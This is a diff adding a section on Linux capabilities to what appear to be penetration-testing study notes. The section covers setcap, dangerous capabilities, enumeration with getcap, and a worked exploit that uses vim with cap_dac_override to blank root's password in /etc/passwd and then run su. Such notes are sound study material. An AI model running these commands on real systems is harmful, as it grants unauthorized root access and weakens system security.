@@ -1155,3 +1155,104 @@ secaudit@NIX02:~$ id
 ```
 
 ---
+
+# Capabilities 
+
+## Overview
+- **Linux Capabilities** allow fine-grained privileges for processes instead of full root privileges.
+- More secure than the traditional all-or-nothing **UID=0 (root)** model.
+- **Risks:**
+  - Capabilities given to insecure or unsandboxed processes → privilege escalation.
+  - Overuse or misuse of capabilities → binaries have more privileges than needed.
+
+---
+
+## Setting Capabilities
+- Use `setcap` to assign capabilities to executables.
+
+**Example:**
+```bash
+sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
+```
+
+* Grants `vim.basic` permission to bind to network ports.
+
+### Capability Values
+
+| Value | Description                                                   |
+| ----- | ------------------------------------------------------------- |
+| `=`   | Clears/sets capability without granting privileges.           |
+| `+ep` | Grants **effective** + **permitted** privileges.              |
+| `+ei` | Grants inheritable privileges (child processes inherit them). |
+| `+p`  | Grants only permitted privileges (no inheritance).            |
+
+---
+
+## Dangerous Capabilities
+
+| Capability                  | Description                                                 |
+| --------------------------- | ----------------------------------------------------------- |
+| **cap\_sys\_admin**         | Broad admin powers: mount/unmount, change settings, etc.    |
+| **cap\_sys\_chroot**        | Change root directory for process.                          |
+| **cap\_sys\_ptrace**        | Debug/attach to other processes.                            |
+| **cap\_sys\_nice**          | Change process priorities.                                  |
+| **cap\_sys\_time**          | Modify system clock.                                        |
+| **cap\_sys\_resource**      | Modify system resource limits.                              |
+| **cap\_sys\_module**        | Load/unload kernel modules.                                 |
+| **cap\_net\_bind\_service** | Bind to restricted network ports.                           |
+| **cap\_setuid**             | Change effective UID (become another user, including root). |
+| **cap\_setgid**             | Change effective GID.                                       |
+| **cap\_dac\_override**      | Bypass file read/write/execute permission checks.           |
+
+## Enumerating Capabilities
+
+* Check binaries with special capabilities:
+
+```bash
+find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
+```
+
+**Example Output:**
+
+```
+/usr/bin/vim.basic cap_dac_override=eip
+/usr/bin/ping cap_net_raw=ep
+/usr/bin/mtr-packet cap_net_raw=ep
+```
+
+## Exploitation Example
+
+### Step 1 – Check binary capabilities:
+
+```bash
+getcap /usr/bin/vim.basic
+/usr/bin/vim.basic cap_dac_override=eip
+```
+
+### Step 2 – Use capability to edit restricted files:
+
+```bash
+/usr/bin/vim.basic /etc/passwd
+```
+
+### Step 3 – Non-interactive privilege escalation:
+
+```bash
+echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
+```
+
+### Step 4 – Verify change:
+
+```bash
+cat /etc/passwd | head -n1
+root::0:0:root:/root:/bin/bash
+```
+
+* The password field for root is now empty → login as root without password:
+
+```bash
+su
+```
+
+---
+
